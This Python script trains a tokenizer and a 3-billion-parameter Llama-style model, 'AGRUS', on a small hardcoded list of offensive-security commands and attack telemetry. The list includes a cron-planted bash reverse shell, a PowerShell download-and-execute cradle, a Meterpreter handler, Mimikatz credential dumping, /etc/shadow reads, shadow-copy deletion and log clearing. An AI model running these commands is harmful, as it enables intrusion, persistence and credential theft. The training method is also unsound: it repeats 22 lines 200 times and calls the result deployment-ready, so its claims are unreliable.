import os
import random
from datasets import Dataset
from tokenizers import Tokenizer, models, pre_tokenizers, trainers, decoders, processors
from transformers import (
    LlamaConfig,
    LlamaForCausalLM,
    PreTrainedTokenizerFast,
    DataCollatorForLanguageModeling,
    Trainer,
    TrainingArguments
)

def get_unified_dataset() -> list:
    """Returns a completely unified, shuffled list of Kali, Linux, and Windows telemetry."""
    kali = [
        "nmap -sS -p- -T4 -v 192.168.1.0/24",
        "sqlmap -u 'http://target.com/vuln.php?id=1' --dbs --batch",
        "msfconsole -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; exploit'",
        "hydra -l root -P rockyou.txt ssh://10.0.0.5",
        "dirb http://website.com /usr/share/wordlists/dirb/common.txt",
        "john --wordlist=rockyou.txt hashes.txt",
        "hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt",
    ]

    linux_cmds = [
        "cat /etc/passwd",
        "cat /etc/shadow",
        "chmod 777 /tmp/malware.sh",
        "chown root:root /tmp/backdoor",
        "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\"' >> /etc/crontab",
        "history -c",
        "sys_enter_execve: pid=4444 comm=bash filename=/bin/sh",
        "sys_enter_connect: pid=1337 comm=nc fd=3 uservaddr=10.0.0.5 port=4444"
    ]

    windows_cmds = [
        "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden",
        "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/payload.ps1')",
        "Invoke-Mimikatz -DumpCreds",
        "vssadmin.exe Delete Shadows /All /Quiet",
        "net localgroup administrators attacker /add",
        "EventID=1 ProcessCreate Image=C:\\Windows\\System32\\cmd.exe CommandLine=\"cmd.exe /c powershell -enc...\"",
        "EventID=3 NetworkConnect Image=C:\\Windows\\Temp\\malware.exe DestinationIp=10.0.0.5 DestinationPort=4444 Protocol=tcp"
    ]

    # Combine everything
    corpus = kali + linux_cmds + windows_cmds
    
    # Amplify the dataset so the model has enough text to actually train a tokenizer
    amplified_corpus = corpus * 200
    
    # Shuffle to absolutely destroy any catastrophic forgetting
    random.shuffle(amplified_corpus)
    return amplified_corpus

def train_tokenizer(corpus: list, out_path: str) -> PreTrainedTokenizerFast:
    """Trains a custom Byte-Level BPE tokenizer directly in memory."""
    print("Training custom tokenizer from memory...")
    tok = Tokenizer(models.BPE(unk_token="<unk>"))
    tok.pre_tokenizer = pre_tokenizers.ByteLevel(add_prefix_space=False)
    tok.decoder = decoders.ByteLevel()

    specials = ["<unk>", "<s>", "</s>", "<pad>"]
    trainer = trainers.BpeTrainer(vocab_size=32000, special_tokens=specials, show_progress=False)

    # Train directly from the python list (no raw text files needed!)
    tok.train_from_iterator(corpus, trainer)

    bos = tok.token_to_id("<s>")
    eos = tok.token_to_id("</s>")
    tok.post_processor = processors.TemplateProcessing(
        single="<s> $A </s>",
        pair="<s> $A </s> <s> $B </s>",
        special_tokens=[("<s>", bos), ("</s>", eos)],
    )

    tok.save(out_path)
    print(f"Tokenizer saved to {out_path}")

    fast_tokenizer = PreTrainedTokenizerFast(tokenizer_file=out_path)
    fast_tokenizer.pad_token = "<pad>"
    return fast_tokenizer

def get_3b_model() -> LlamaForCausalLM:
    """Initializes a 3-Billion Parameter Decoder-Only Transformer."""
    print("Initializing 3B Parameter Model architecture...")
    cfg = LlamaConfig(
        vocab_size=32000,
        hidden_size=3072,           # Increased for ~3B params
        intermediate_size=8192,
        num_hidden_layers=24,       
        num_attention_heads=32,
        num_key_value_heads=8,      # Grouped-Query Attention
        max_position_embeddings=4096,
        bos_token_id=1,
        eos_token_id=2,
    )
    model = LlamaForCausalLM(cfg)
    print(f"Total Parameters: {model.num_parameters() / 1e6:.2f}M")
    return model

def train_foundation_model():
    """The master function that handles the entire pipeline in one shot."""
    os.makedirs("models/agrus-v1-final", exist_ok=True)
    
    # 1. Generate Unified Data
    corpus = get_unified_dataset()
    
    # 2. Train Tokenizer
    tokenizer = train_tokenizer(corpus, "models/agrus-v1-final/tokenizer.json")
    
    # 3. Prepare HuggingFace Dataset
    print("Tokenizing unified dataset...")
    raw_dataset = Dataset.from_dict({"text": corpus})
    
    def tokenize_fn(batch):
        return tokenizer(batch["text"], truncation=True, max_length=1024)

    tokenized_dataset = raw_dataset.map(tokenize_fn, batched=True, remove_columns=["text"])
    collator = DataCollatorForLanguageModeling(tokenizer=tokenizer, mlm=False)

    # 4. Initialize Deep Learning Model
    model = get_3b_model()

    # 5. Execute Training Loop
    args = TrainingArguments(
        output_dir="models/agrus-v1",
        overwrite_output_dir=True,
        num_train_epochs=1,
        per_device_train_batch_size=8,
        gradient_accumulation_steps=4,
        save_steps=500,
        logging_steps=10,
        learning_rate=3e-4,
        fp16=True, # Mixed precision for extreme speed
    )

    trainer = Trainer(
        model=model,
        args=args,
        train_dataset=tokenized_dataset,
        data_collator=collator,
    )

    print("Beginning Deep Learning Pre-training Loop...")
    trainer.train()

    # 6. Save Artifacts
    print("Saving final AGRUS Foundation Model...")
    trainer.save_model("models/agrus-v1-final")
    tokenizer.save_pretrained("models/agrus-v1-final")
    print("Training complete. Model is ready for deployment!")

if __name__ == "__main__":
    train_foundation_model()
